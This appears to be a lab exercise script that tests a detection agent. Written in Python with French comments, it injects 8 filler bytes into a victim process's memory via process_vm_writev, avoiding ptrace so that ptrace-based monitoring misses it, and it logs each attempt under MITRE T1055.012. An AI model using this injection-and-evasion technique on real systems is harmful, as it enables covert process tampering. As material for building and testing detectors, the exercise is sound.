#!/usr/bin/env python3
"""
EVASION 3 - process_vm_writev, sans ptrace
(Version mise a jour Semaine 6 : journalisation cote attaquant ajoutee)
Usage: sudo python3 evasion3_process_vm_writev.py <PID_victime> <adresse_hex>
"""

import ctypes
import ctypes.util
import sys
import os
import time
from attacker_log import log_attempt

if len(sys.argv) != 3:
    print(f"Usage: sudo python3 {sys.argv[0]} <PID_victime> <adresse_hex>")
    sys.exit(1)

victim_pid = int(sys.argv[1])
target_addr = int(sys.argv[2], 16)

libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

class iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]

libc.process_vm_writev.restype = ctypes.c_ssize_t
libc.process_vm_writev.argtypes = [
    ctypes.c_int,
    ctypes.POINTER(iovec), ctypes.c_ulong,
    ctypes.POINTER(iovec), ctypes.c_ulong,
    ctypes.c_ulong,
]

start_time = time.time()
print(f"[EVASION-3] Attaquant PID {os.getpid()} -> Victime PID {victim_pid}")
print("[EVASION-3] Strategie : process_vm_writev() - AUCUN appel a ptrace\n")

payload = b"\x42" * 8
local_buf = ctypes.create_string_buffer(payload)
local_iov = iovec(ctypes.cast(local_buf, ctypes.c_void_p), len(payload))
remote_iov = iovec(ctypes.c_void_p(target_addr), len(payload))

print("[EVASION-3] Appel unique de process_vm_writev() ...")
ctypes.set_errno(0)
written = libc.process_vm_writev(victim_pid, ctypes.byref(local_iov), 1, ctypes.byref(remote_iov), 1, 0)

if written == -1:
    err = ctypes.get_errno()
    print(f"[EVASION-3] ECHEC : {os.strerror(err)} (errno {err})")
    log_attempt(
        technique="process_vm_writev - evasion hook ptrace",
        mitre_id="T1055.012",
        target_pid=victim_pid,
        target_process="victim.py",
        success=False,
        details=f"Echec : {os.strerror(err)}",
    )
    if err == 1:
        print("[EVASION-3] Astuce : execute ce script avec sudo.")
    sys.exit(1)

total_delta = time.time() - start_time

print(f"[EVASION-3] Reussi : {written} octets ecrits directement dans PID {victim_pid}")
print("[EVASION-3] AUCUN PTRACE_ATTACH, AUCUN PTRACE_POKEDATA n'a ete utilise.")
print("\n[EVASION-3] Termine. Verifie le terminal de l'agent.")

# --- NOUVEAU : journalisation cote attaquant ---
log_attempt(
    technique="process_vm_writev - evasion hook ptrace",
    mitre_id="T1055.012",
    target_pid=victim_pid,
    target_process="victim.py",
    success=True,
    details=f"Ecriture directe de {written} octets en {total_delta:.3f}s, sans ptrace",
)
